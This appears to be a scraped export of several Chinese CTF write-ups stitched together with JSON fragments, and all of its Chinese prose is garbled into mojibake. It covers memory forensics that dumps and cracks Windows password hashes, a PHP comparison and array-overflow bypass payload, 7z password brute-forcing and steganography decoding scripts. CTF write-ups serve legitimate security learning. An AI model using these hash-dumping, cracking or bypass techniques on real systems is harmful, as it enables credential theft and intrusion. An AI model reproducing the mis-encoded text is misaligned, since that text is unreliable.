æ¯”èµ›ç»“æŸåæœ¬æ¥è¿˜æƒ³å¤ç°å‡ ä¸ªé¢˜çš„ï¼Œå’•ç€å’•ç€å‘ç°éƒ½å¿˜è®°äº†ï¼Œè¿™é‡Œå°±æŠŠå‡ ä¸ªç®€å•é¢˜å‘ä¸€å‘å¥½äº†å§ã€‚ Miscvery-ez-dump é“¾æ¥ï¼šhttps://pan.baidu.com/s/1mqJsQN1kfNFwV0lpGiOBpg æå–ç ï¼šnews ï¼ˆæˆ–å»å®˜æ–¹æ¯”èµ›ç¾¤1063624041çš„ç¾¤æ–‡ä»¶-ä¸´æ—¶é¢˜ç›®æ–‡ä»¶å¤¹ä¸­è·å–ï¼‰ # volatility -f mem.raw --profile Win7SP1x64 filescan | grep Desktop Volatility Foundation Volatility Framework 2.6 0x000000003dca8280 4 0 R--r-d \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop\\DumpIt.exe 0x000000003dcc8600 2 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\Links\\Desktop.lnk 0x000000003de778f0 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop 0x000000003dfdcd20 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop 0x000000003e0e9f20 1 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\AppData\\Roaming\\Microsoft\\Windows\\SendTo\\Desktop.ini 0x000000003e156f20 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop\\desktop.ini 0x000000003e15aac0 2 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop\\desktop.ini 0x000000003e16c250 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Desktop.ini 0x000000003e16e070 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Desktop.ini 0x000000003e16ff20 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\Desktop.ini 0x000000003e170f20 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Accessibility\\Desktop.ini 0x000000003e171f20 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\System Tools\\Desktop.ini 0x000000003e172d00 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Games\\Desktop.ini 0x000000003e174e20 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\Desktop.ini 0x000000003e175af0 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\System Tools\\Desktop.ini 0x000000003e176890 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Accessibility\\Desktop.ini 0x000000003e50cd10 16 0 RW-rw- \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop\\è®¡ç®—æœº - å¿«æ·æ–¹å¼.lnk 0x000000003f6bf330 2 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Remote Desktop Connection.lnk 0x000000003fa20e20 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop 0x000000003fa4b450 16 0 RW-r-- \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop\\hint.txt 0x000000003fa557f0 1 0 R--rwd \\Device\\HarddiskVolume1\\Windows\\assembly\\Desktop.ini 0x000000003fa62c60 1 0 R--rwd \\Device\\HarddiskVolume1\\Windows\\Media\\Desktop.ini 0x000000003fa63200 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop 0x000000003fa77920 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop 0x000000003fabec90 1 1 RW-rw- \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop\\WIN-DLV72BHQ4GL-20210520-130833.raw 0x000000003faf9f20 6 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop\\DumpIt.exe # volatility -f mem.raw --profile Win7SP1x64 dumpfiles -Q 0x000000003fa4b450 -D . -u Volatility Foundation Volatility Framework 2.6 DataSectionObject 0x3fa4b450 None \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop\\hint.txt æ¡Œé¢ä¸Šæœ‰ä¸ª hint.txtï¼Œæå–å‡ºæ¥ã€‚ å†…å®¹æ˜¯ you ask me where is the passwd? you can try to find the user passwd. it is so ez!!!!!! é‚£å°±æŸ¥çœ‹å†…å­˜ï¼Œæå–å¯†ç ã€‚ # volatility -f mem.raw --profile Win7SP1x64 hivelist Volatility Foundation Volatility Framework 2.6 Virtual Physical Name ------------------ ------------------ ---- 0xfffff8a001108010 0x000000001e9f0010 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT 0xfffff8a001283010 0x000000003d0fa010 \\??\\C:\\Users\\mumuzi\\ntuser.dat 0xfffff8a00141b010 0x0000000034bea010 \\??\\C:\\Users\\mumuzi\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat 0xfffff8a0020bb010 0x000000002482d010 \\??\\C:\\System Volume Information\\Syscache.hve 0xfffff8a00000f010 0x00000000208a1010 [no name] 0xfffff8a000024010 0x00000000209ac010 \\REGISTRY\\MACHINE\\SYSTEM 0xfffff8a000053010 0x000000001fddb010 \\REGISTRY\\MACHINE\\HARDWARE 0xfffff8a0000f6010 0x000000001a98f010 \\SystemRoot\\System32\\Config\\DEFAULT 0xfffff8a0005fd010 0x0000000022eb3010 \\Device\\HarddiskVolume1\\Boot\\BCD 0xfffff8a0009f5010 0x00000000227ca010 \\SystemRoot\\System32\\Config\\SOFTWARE 0xfffff8a000f2b010 0x000000001f3c2010 \\SystemRoot\\System32\\Config\\SECURITY 0xfffff8a000fc1010 0x0000000000b5a010 \\SystemRoot\\System32\\Config\\SAM 0xfffff8a00107e010 0x00000000055cd010 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT # volatility -f mem.raw --profile Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000fc1010 Volatility Foundation Volatility Framework 2.6 Administrator:500:aad3b435b51404eeaad3b435b51404ee:1507e24d634a54c0b14750a7da2bdfdb::: Guest:501:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b::: mumuzi:1000:aad3b435b51404eeaad3b435b51404ee:0606ac59df4a10d3a9e1f97b3612546f::: # volatility -f mem.raw --profile Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000fc1010 &gt; pass.txt Volatility Foundation Volatility Framework 2.6 # john pass.txt --format=NT Using default input encoding: UTF-8 Loaded 3 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3]) Warning: no OpenMP support for this hash type, consider --fork=2 Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Warning: Only 11 candidates buffered for the current salt, minimum 24 needed for performance. Warning: Only 23 candidates buffered for the current salt, minimum 24 needed for performance. Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 12 candidates buffered for the current salt, minimum 24 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist 123456789 (Guest) Proceeding with incremental:ASCII ... è²Œä¼¼æ²¡å•¥ç”¨â€¦â€¦ çœ‹çœ‹å‘½ä»¤è¡Œè®°å½•ã€‚ # volatility -f mem.raw --profile Win7SP1x64 cmdscan Volatility Foundation Volatility Framework 2.6 ************************************************** CommandProcess: conhost.exe Pid: 1588 CommandHistory: 0x117120 Application: cmd.exe Flags: Allocated, Reset CommandCount: 13 LastAdded: 12 LastDisplayed: 12 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x60 Cmd #0 @ 0x109cf0: dir Cmd #1 @ 0x108290: ipconfig Cmd #2 @ 0xf8bd0: ipconfig 192.168.26.2 Cmd #3 @ 0x116aa0: ping newsctf.top Cmd #4 @ 0x1082d0: network Cmd #5 @ 0x1082f0: net user Cmd #6 @ 0xf8c50: net user Guest 123456789 Cmd #7 @ 0xf8c90: net user mumuzi (ljmmz)ovo Cmd #8 @ 0x108350: clear Cmd #9 @ 0x116a40: if_you_see_it, Cmd #10 @ 0xf8cd0: you_will_find_the_flag Cmd #11 @ 0x116ad0: where_is_the_flag? Cmd #12 @ 0x1178d0: net user Administrator flag_not_here Cmd #29 @ 0x90158: Cmd #30 @ 0x10f920: ************************************************** CommandProcess: conhost.exe Pid: 2824 CommandHistory: 0x357140 Application: DumpIt.exe Flags: Allocated CommandCount: 0 LastAdded: -1 LastDisplayed: -1 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x60 Cmd #29 @ 0x2d0158: 5 Cmd #30 @ 0x34f940: 4 å½“æˆ flag äº¤ä¸Šå»éƒ½ä¸å¯¹ã€‚ä¸ä¿¡äº†ã€‚ å†å»æœä¸€æ³¢æ–‡ä»¶ã€‚ # volatility -f mem.raw --profile Win7SP1x64 filescan |grep \"flag\" Volatility Foundation Volatility Framework 2.6 0x000000003e4b2070 2 0 -W-rwd \\Device\\HarddiskVolume1\\galf\\fl^ag.zipesktop\\fl^ag.zipp\\vmware-mumuzi\\VMwareDnD\\9451fe4f\\flag.zip 0x000000003fa56dd0 2 0 RW-rw- \\Device\\HarddiskVolume1\\Users\\mumuzi\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\flag.lnk # volatility -f mem.raw --profile Win7SP1x64 dumpfiles -Q 0x000000003e4b2070 -D . -u Volatility Foundation Volatility Framework 2.6 DataSectionObject 0x3e4b2070 None \\Device\\HarddiskVolume1\\galf\\fl^ag.zipesktop\\fl^ag.zipp\\vmware-mumuzi\\VMwareDnD\\9451fe4f\\flag.zip ç”¨ (ljmmz)ovo ä½œä¸ºå¯†ç è§£å‹ï¼Œå¾—åˆ° flagã€‚ flag{ez_di_imp_1t_y0u_like?} Cryptoç­¾åˆ° Webeasy_web ç­¾åˆ°é¢˜ é¢˜ç›®åœ°å€ï¼šhttp://47.106.172.29:22221/ hint:è¿™ä¸ªå›¾ç‰‡çœŸå¥½çœ‹å‘€ï¼Œæ²¡å•¥éšè—çš„ä¸œè¥¿å§ å†ä¹Ÿä¸ä¿¡ä½ ä»¬ä»€ä¹ˆç­¾åˆ°é¢˜äº†ï¼ï¼ï¼ å…ˆæŠŠèƒŒæ™¯å›¾ä¸‹è½½ä¸‹æ¥å§ã€‚ æå–å‡ºæ¥ä¸ª zip å¥½å®¶ä¼™ï¼Œçœ‹æ¥ç½‘é¡µä¸Šåˆæœ‰å‡çš„ flagã€‚åŸæ¥æ˜¯ Misc + Web å•Šã€‚ ç½‘é¡µä¸Šç»™äº†æºç ã€‚ &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=UTF-8\"&gt; &lt;title&gt;EasyWeb&lt;/title&gt; &lt;style&gt; html, body { margin: 0; padding: 0; width: 100%; height: 100%; text-align: center; } body { background-image: url(backImg.jpg); background-size: contain; } .content { width: 80%; text-align: left; padding : 10px; margin: 0 auto; background-color: rgb(255, 255, 255, 0.7); } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;EasyWeb&lt;/h1&gt; &lt;div class=\"content\"&gt; &lt;?php highlight_file(\"index.php\") ?&gt; &lt;/div&gt; &lt;div class=\"content\"&gt; &lt;?php $six_number = $_POST['webp']; $a = $_POST['a']; $b = $_POST['b']; $c = $_POST['c']; if (md5($six_number) == 'e10adc3949ba59abbe56e057f20f883e' &amp;&amp; md5($a) === md5($b) &amp;&amp; $a !== $b) { if($array[++$c]=1){ if($array[]=1){ echo \"nonono\"; } else{ require_once 'flag.php'; echo $flag; } } } ?&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; md5 e10adc3949ba59abbe56e057f20f883e å¯¹åº”çš„æ˜æ–‡æ˜¯ 123456ï¼Œmd5 ç›¸åŒè€Œå†…å®¹ä¸åŒçš„è¯å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œå³ a[]=1&amp;b[]=2. ç„¶è€Œè¿™ä¸ª if($array[]=1) æ€ä¹ˆç»•è¿‡ï¼Œå’±ä¸¤å¤©é‡Œæ–­æ–­ç»­ç»­æƒ³ç€ä¹Ÿæ²¡æƒ³å‡ºæ¥â€¦â€¦ æœ€åæ¯”èµ›ç»“æŸäº†æ‰çŸ¥é“æ˜¯æ•°ç»„ Key æ•´æ•°æº¢å‡ºã€‚ åœ¨ php ä¸­ä¸€ä¸ª array åŒ…å«é”® key å’Œå€¼ valueï¼Œå½“ç»™ä¸€ä¸ªæœªæŒ‡å®š key çš„ array èµ‹å€¼æ—¶ï¼Œä¼šè‡ªåŠ¨ç»™å½“å‰ key èµ‹å€¼ä¸ºä¸Šä¸€ä¸ªä½¿ç”¨è¿‡çš„ æ•´æ•° key +1ï¼ˆä¸€ä¸ªæ•´æ•°ï¼‰ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨è¿‡çš„è¯åˆ™ä¸º 0. å‡å¦‚ä¹‹å‰çš„ key æ˜¯ä¸ªå­—ç¬¦æˆ–å­—ç¬¦ä¸²ï¼Œé‚£æ–°çš„ä¸‹æ ‡ä¹Ÿå°±æ˜¯ 0. å¦å¤– php çš„ ++ é™¤äº†ä¼šç»™æ•´æ•° +1 å¤–ï¼Œè¿˜å¯ä»¥ç»™å­—ç¬¦ +1ï¼Œå€’æ˜¯å­—ç¬¦çš„ ++ æœ‰äº¿ç‚¹æ€ªï¼Œæ¯”å¦‚ z-&gt; aa, Z -&gt; AA, 1Z -&gt; 2A, Zaf -&gt; Zag, 3adAZ -&gt; 3adBA, etc. è¿™é‡Œå°±ä¸ç ”ç©¶äº†ï¼Œä¹Ÿä¸æ˜¯è¿™é¢˜å…³é”®ï¼ˆå–µå–µæ‡µäº†ï¼Œæ„Ÿè§‰å¾—çœ‹åº•å±‚æºç æ‰çŸ¥é“ è€Œè¿™é‡Œçš„æœ€å¤§è¡¨ç¤ºæ•°æ˜¯ 2**63-1ï¼Œå³ 9223372036854775807ï¼Œç„¶åå› ä¸º if($array[++$c]=1) åšäº†è‡ªå¢å¤„ç†ï¼Œå’±æŠŠ c è®¾ä¸º 9223372036854775806ï¼Œå½“ if($array[]=1) èµ‹å€¼çš„æ—¶å€™å°±ä¼šé€ æˆæº¢å‡ºï¼ŒæŠ¥é”™ä¸”åˆ¤æ–­ä¸ä¸ºçœŸï¼Œä»è€Œèƒ½å¤Ÿæ‹¿åˆ° $flag. ï¼ˆæ„Ÿè§‰è¯´çš„å¥½ä¹±å•Šï¼Œéšæ„çœ‹çœ‹å°±å¥½äº† äºæ˜¯ Payloadï¼š webp=123456&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806 ä½ çœ‹ä»–è¿™é‡ŒæŠ¥çš„é”™å°±æ˜¯ ç”±äºä¸‹ä¸€ä¸ªå…ƒç´ è¢«å ç”¨è€Œä¸èƒ½å°†å…¶æ·»åŠ åˆ° array ä¸­ã€‚ password: xluoyyds123456@@@ æ‹¿å»è§£å‹å¾—åˆ°æœ€ç»ˆçš„ flagã€‚ newsctf{this_1s_veryveryveryeasyweb} å»æœäº†ä¸€ä¸‹ stackoverflow: â€œnext element is already occupiedâ€ error å…¶å®è¿™é¢˜çš„ c å°±æ˜¯èµ‹å€¼ä¸º PHP_INT_MAX -1. ç›¸å½“äºåœ¨ PHP é‡Œä¸€ä¸ª array æœ€å¤šèƒ½å¤Ÿè¡¨ç¤ºçš„å…ƒç´ ä¸ªæ•°å°±æ˜¯ PHP_INT_MAX äº†ã€‚ ç„¶ååˆå‘ç°ï¼Œåœ¨å»å¹´å‘å¸ƒçš„ PHP8 é‡Œï¼Œè¿™ä¸ª æŠ›å‡ºå¼‚å¸¸å˜æˆ Error äº†ï¼ ï¼ˆå®‰å…¨æ€§æå‡++ å°ç»“å…¶ä»–æœ‰çš„é¢˜ç›®è¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ã€‚ å°±å…ˆè¿™æ ·å§ï¼ˆæ‘Šæ‰‹ç¡å¤§è§‰ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/06/18/CTF_2021NewsCTF0601/"},{"title":"CTF | 2021 æ˜¥ç§‹æ¯ Baby_steg WriteUp","text":"å¼•è¨€ 2021å¹´ æ˜¥ç§‹æ¯ ç½‘ç»œå®‰å…¨è”èµ›æ˜¥å­£èµ› æ¯”èµ›æ—¶é—´ï¼š2021å¹´5æœˆ29æ—¥ 10:00-18:00 https://www.ichunqiu.com/chunqiucup å’Œä¸Šä¸€ç¯‡ä¸€æ ·ï¼Œè¿™å‘¨æœ«æ¯”èµ›å·¨å¤šã€‚ äºæ˜¯æ˜¥ç§‹æ¯çš„è¯ä¹Ÿæ˜¯éšæ„çœ‹äº†é¢˜ï¼Œç„¶è€Œå‘ç°é¢˜ç›®æŒºéš¾çš„ Orzã€‚ è¿™ä¸ªæ¯”èµ›çš„æ—¶å€™å°±æ‘¸é±¼åšäº† Misc Baby_steg é¢˜ç›®çš„ä¸€åŠï¼Œå‰©ä¸‹ä¸€åŠè¿˜æ˜¯æ¯”èµ›åå¤ç°çš„ã€‚å…¶ä»–é¢˜ç›®å°±æ²¡æ€ä¹ˆçœ‹å§ã€‚ è¿™é¢˜ç»“åˆäº†å‡ ä¸ªä¹‹å‰æ²¡è§è¿‡çš„ç©æ³•ï¼Œè¿™é‡Œé¡ºæ‰‹è®°å½•ä¸€ä¸‹ã€‚ Baby_steg å°Aæƒ³å­¦MISCï¼Œå¥¹è¯·æ•™äº†æŸå¤§ä½¬ï¼Œå¤§ä½¬ä¸ºäº†è€ƒéªŒå¥¹çš„èƒ½åŠ›ï¼Œç»™äº†å¥¹ä¸€ä¸ªæ–‡ä»¶ï¼Œè®©å¥¹æ‰¾åˆ°å…¶ä¸­éšè—çš„ç§˜å¯†ï¼Œå¯æ˜¯å°Aæ‹¿åˆ°æ–‡ä»¶åä¸€è„¸æ‡µé€¼ï¼Œæ‰€ä»¥æ¥æ‰¾ä½ æ±‚æ•‘ï¼Œä½ èƒ½å¸®åŠ©å¥¹å—? é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ hint:å…ˆè·å–password.7zé‡Œé¢çš„å†…å®¹ï¼Œå¤§ä½¬å¥½åƒè·Ÿå°Aè¯´æ˜¯6-8ä½çš„æ•°å­— ä¸‹è½½ä¸‹æ¥ä¸ªå‹ç¼©åŒ…ã€‚ æ ¹æ®æç¤ºéœ€è¦å…ˆè§£å¯†é‚£ä¸ª 7zã€‚ æœäº†ä¸€ä¸‹å‘ç° cRARk for 7-Zip ç”¨æ¥çˆ†ç ´è¿˜æŒºä¸é”™ï¼Œæ”¯æŒè‡ªå®šä¹‰å„ç§æ ¼å¼çš„å¯†ç ï¼Œè¿˜èƒ½è°ƒç”¨ GPU åŠ é€Ÿè¿ç®—ã€‚ åœ¨ https://www.crark.net/crark-7zip.html è¿™é‡Œä¸‹è½½ã€‚ å‚è€ƒ https://www.crark.net/cRARk-7z.html å†™ password.def å®šä¹‰æ–‡ä»¶ã€‚ ç”±äºå…¨æ˜¯æ•°å­—ï¼Œç›´æ¥å°±å†™æˆè¿™æ ·ã€‚ ## $1 * ç„¶åæŒ‡å®šæœ€å°å’Œæœ€å¤§çš„é•¿åº¦å»è§£å¯†ã€‚ crark-7z.exe -l6 -g8 password.7z å¾—åˆ° 7z çš„å¯†ç  321456 è§£å‹å‡ºæ¥ä¸ª password.txt 7324623c flag1.txt è¿™æ˜¯ä»€ä¹ˆç©æ„â€¦â€¦ åæ¥çœ‹äº†åˆ«äºº wp æ‰å‘ç°æ˜¯ uuencodeã€‚æ¥å¤ç°ä¸€ä¸‹ã€‚ æ‹¿ python å†™ä¸ªè„šæœ¬è§£ç ä¸€ä¸‹ã€‚ import uu s = uu.decode('flag1.txt') å®ƒä¼šè‡ªåŠ¨è¾“å‡ºæ–‡ä»¶ã€‚ åŠ å¯†çš„è¯å°±æ˜¯ uu.encode(input_file, output_file) ç”¨ä¸Šé¢è§£å¯†å¾—åˆ°çš„ 7324623c ä½œä¸ºå¯†ç è§£å‹ã€‚ å¾—åˆ°ä¸€å¼ å›¾ challenge.png ä»¥åŠ encode.py import numpy as np import cv2 import sys import random def encode(image): i = random.randint(520,540) np.random.seed(i) # image = 1298 * 695 to_hide = cv2.imread(image) to_hide_array = np.asarray(to_hide) for i in range(to_hide_array.shape[0]): np.random.shuffle(to_hide_array[i]) gray = cv2.cvtColor(to_hide_array, cv2.COLOR_BGR2GRAY) cv2.imwrite('challenge.png', gray) print(\"encode!\") def main(): if len(sys.argv) != 2: print('error!') exit(1) encode(sys.argv[1]) if __name__ == '__main__': main() éšæœºæ•°ç§å­åœ¨ 520-540 ä¹‹å‰å–å€¼ï¼Œnp.random.shuffle å‡½æ•°æŠŠ to_hide_array ç¬¬1ä¸ªç»´åº¦ä¸Šçš„æ•°å­—è¿›è¡Œä½ç½®ä¸Šçš„éšæœºæ‰“ä¹±ã€‚ äºæ˜¯å¯ä»¥è¯•è¯•çˆ†ç ´è¿™ä¸ªéšæœºæ•°ç§å­ï¼Œè®°å½•ä¸‹æ‰“ä¹±å‰åä¸‹æ ‡çš„æ˜ å°„å…³ç³»ï¼Œå†åè¿‡æ¥æ¢å¤å‡ºåŸå§‹å›¾åƒï¼Œå…¶ä¸­ä¸€ä¸ªå°±æ˜¯æ‰“ä¹±ä¹‹å‰çš„å›¾åƒäº†ã€‚ å¦å¤–æ³¨æ„ random.randint(520,540) åœ¨ 520 å’Œ 540 ä¸Šéƒ½èƒ½å–åˆ°å€¼ï¼Œå³å·¦å³åŒºé—´éƒ½é—­åˆã€‚ ä»£ç å†™çš„æœ‰ç‚¹ä¹±ï¼Œèƒ½ç”¨å°±è¡Œäº†ã€‚ï¼ˆé€ƒèµ° import numpy as np import cv2 import sys import random def decode(image): # image = 1298 * 695 to_hide = cv2.imread(image) to_hide_array = np.asarray(to_hide) shape = to_hide_array.shape for i in range(520, 541): print('====&gt;', i) np.random.seed(i) l1 = [] for j in range(shape[0]): l2 = list(range(shape[1])) new_array = [] np.random.shuffle(l2) for x in range(len(l2)): new_array.append(to_hide_array[j][l2.index(x)]) l1.append(new_array) l1_array = np.asarray(l1) # gray = cv2.cvtColor(l1_array, cv2.COLOR_BGR2GRAY) cv2.imwrite(f'decode{i}.png', l1_array) def main(): decode('challenge.png') if __name__ == '__main__': main() æœ€åè·‘å‡ºæ¥æ˜¯éšæœºç§å­ä¸º 540 æ—¶å€™çš„æƒ…å†µï¼Œå¾—å‡º flagã€‚ å°ç»“Baby_steg è¿™é¢˜è¿˜æ˜¯å †äº†å‡ ä¸ªæ²¡ç©è¿‡çš„çŸ¥è¯†ç‚¹çš„ï¼Œæ­£å¥½è¿˜æŠŠ 7z å‹ç¼©åŒ…çˆ†ç ´çš„å·¥å…·ä¹Ÿæ‰¾äº†ä¸€æ³¢ï¼ŒcRARk for 7-Zip è¿˜æ˜¯æŒºé¦™çš„ï¼ é¡ºä¾¿è¿˜å‘ç°äº† python é‡Œçš„ uu å°±èƒ½ç›´æ¥è¿›è¡Œ uuencode ç¼–è§£ç ï¼Œå¥½è€¶ã€‚ å°±è¿™æ ·å§ï¼Œæ‘¸ğŸŸå¤§æ³•å¥½ï¼ BTWï¼ŒXCTF final çš„é¢˜ç›®å¤ªé¡¶äº†ï¼Œå–µå–µå¥½èœç©ä¸æ¥ï¼Œå–µå‘œå‘œå‘œã€‚ ï¼ˆçœ‹å•¥æ—¶å€™æœ‰æœºä¼šå†æ‘¸é±¼æ¥å¤ç°å§ï¼Œå–µå–µğŸ± ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/05/31/CTF_2021chunqiu_Baby_steg/"},{"title":"CTF | 2021 DASCTF May WriteUp","text":"å¼•è¨€ DASCTF May 2021å¹´5æœˆ29æ—¥ 10:00-18:00 https://buuoj.cn/ è¿™å‘¨æœ«å¥½å•Šï¼Œç‰¹åˆ«æ˜¯5æœˆ29æ—¥çœŸæ˜¯ä¸ªå¥½æ—¥å­ï¼Œä¸€å †æ¯”èµ›å…¨å †åœ¨è¿™å¤©äº†â€¦â€¦ æ¯”å¦‚ DASCTF Mayã€æ˜¥ç§‹æ¯ã€XCTF finalã€DozerCTFï¼Œbalabalaã€‚ å‡ ä¸ªæ¯”èµ›é¢˜ç›®å¤§æ¦‚çœ‹äº†çœ‹ï¼ŒDASCTF May è¿™æ¬¡æ¯”è¾ƒåŸºç¡€ï¼ˆèµµæ€»è²Œä¼¼ä¹Ÿè¯´æ˜¯ä¸ºäº†æµ‹è¯• buuoj çš„ matches æ–°æ¨¡å—ï¼‰ï¼Œè¿™é‡Œå°±éšæ„å†™å†™å½“ä½œåšé¢˜è®°å½•å¥½äº†ã€‚ MiscHolmes Do you know Holmes? æ–‡ä»¶ç»“å°¾ä¸€ä¸ª rar å‹ç¼©åŒ… å›¾ç‰‡ä¸Šæ˜¯ä¸ªè·³èˆçš„å°äººå¯†ç ï¼Œå‚è€ƒä¸‹å›¾ã€‚ å¾—åˆ°å¯†ç ä¸º YOYAREHOLMESï¼Œç„¶è€Œå¹¶ä¸å¯¹ï¼Œæ ¹æ®æ„æ€åº”è¯¥æ˜¯ YOUAREHOLMES è§£å‹å¾—åˆ° flag.py flag=\"flag{********************************}\" encflag=[] for i in range(len(flag)): encflag.append((ord(flag[i])+i)%128) print(encflag) ''' [102, 109, 99, 106, 127, 57, 60, 104, 60, 107, 61, 62, 65, 68, 115, 64, 67, 119, 66, 74, 73, 74, 119, 75, 74, 79, 79, 76, 78, 82, 78, 85, 83, 84, 82, 86, 92, 34] ''' é€†ç€å†™è„šæœ¬è§£å¯†å°±å¥½ã€‚ l = [102, 109, 99, 106, 127, 57, 60, 104, 60, 107, 61, 62, 65, 68, 115, 64, 67, 119, 66, 74, 73, 74, 119, 75, 74, 79, 79, 76, 78, 82, 78, 85, 83, 84, 82, 86, 92, 34] flag = '' for k, v in enumerate(l): try: s = chr(v-k) except: s = chr(v-k+128) flag += s print(s, flag) print(flag) flag{46a4b3357e13f0755a42651250633038} rickroll_u we will rickroll you!ï¼ˆflagå†…å®¹ä¸ºå­—æ¯æ•°å­—ç»„åˆï¼Œè¯·MD5åæäº¤ã€‚ï¼‰ é“¾æ¥: https://pan.baidu.com/s/1JJ8AtqFJVFa6u9z7RKunPw å¯†ç : nwld å‹ç¼©åŒ…æ˜æ–‡è§£å¯†ï¼Œå…ˆæŠŠ ah_old_time.txt ä»¥ä¸å‹ç¼©çš„æ–¹å¼å¼„æˆä¸€ä¸ªå‹ç¼©åŒ…ã€‚ è·‘å‡ºæ¥å¯†ç æ˜¯ t!m32R1ã€‚ è§£å‹å‡ºæ¥æœ‰ä¸ªéŸ³é¢‘æ–‡ä»¶ rickroll_u.wav å¥½å®¶ä¼™ï¼Œæ˜¯é‚£ä¸ªç†æŸ¥å¾·Â·è‰¾æ–¯åˆ©çš„ Never Gonna Give You Upï¼Œå¤ªç»å…¸å•¦ã€‚ æ–‡ä»¶ç»“å°¾è¿˜æœ‰ä¸ª wavï¼Œæ‰‹åŠ¨æå–å‡ºæ¥ã€‚ å‘ç°æ˜¯ä¸ª DTMF. æå–å‡ºæ¥æ˜¯ 0916A639ã€‚å‘ç° md5 æäº¤ä¸Šå»ä¸å¯¹ã€‚ æœ€åå‘ç°å­—æ¯æ˜¯å°å†™ã€‚ã€‚ã€‚0916a639 md5 =&gt; c8c15a11dd2852cbe63df405debc9d41 ç›´æ¥äº¤ä¸Šå»å°±è¡Œã€‚ DCT domain steganography &amp; crack hint1é“¾æ¥: https://pan.baidu.com/s/1obhR1KqUv2VCuyC0Qy62AQ å¯†ç : t86j è¿™é‡Œæœ‰ä¸ª top 1000 å¯†ç  å¼€å±€ä¸€å¼ å›¾â€¦â€¦ DCT åŸŸéšå†™çš„æœ‰å¥½å‡ ä¸ªå·¥å…·æ¥ç€ï¼Œç»™äº†ä¸ª top1000 å¯†ç åº”è¯¥å°±æ˜¯ç”¨æ¥è§£å¯†çš„å¯†é’¥äº†ã€‚ ï¼ˆæ„Ÿè§‰æ²¡æ„æ€ï¼Œæ²¡å¾€ååšäº†ï¼Œåæ¥ç¾¤é‡Œè¯´æ˜¯ outguess sseddoGä¸‹è½½ä¸‹æ¥æ˜¯ä¸ªæµé‡åŒ…ï¼Œæå–å‡ºæ¥æœ‰ä¸ªAthena.png ç»“å°¾æ‹¼æ¥äº†ä¸ª xmlï¼Œé‡Œé¢æœ‰å…¬é’¥å’Œç§é’¥ã€‚ &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;ATHENA&gt; &lt;TASKING&gt; &lt;COMMAND_EXECUTE_TIMEOUT&gt;10&lt;/COMMAND_EXECUTE_TIMEOUT&gt; &lt;STATE_FILE_PATH&gt;.\\STATE_FILES&lt;/STATE_FILE_PATH&gt; &lt;MAX_CPU_UTILIZATION&gt;40&lt;/MAX_CPU_UTILIZATION&gt; &lt;MAX_PROCESSING_DATA_SIZE&gt;1000000&lt;/MAX_PROCESSING_DATA_SIZE&gt; 